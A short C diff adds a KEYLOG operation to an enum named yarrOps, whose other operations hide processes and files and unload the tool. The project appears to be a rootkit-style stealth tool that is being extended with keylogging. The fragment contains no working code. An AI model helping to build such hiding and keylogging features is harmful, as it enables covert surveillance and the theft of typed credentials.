@@ -43,7 +43,8 @@ typedef enum {
 	STOP_HIDE_PROCESS,
 	HIDE_FILE,
 	STOP_HIDE_FILE,
-	UNLOAD_YARR
+	UNLOAD_YARR,
+	KEYLOG
 } yarrOps;
 
 // TODO: This will need more fields when we implement more functionality.
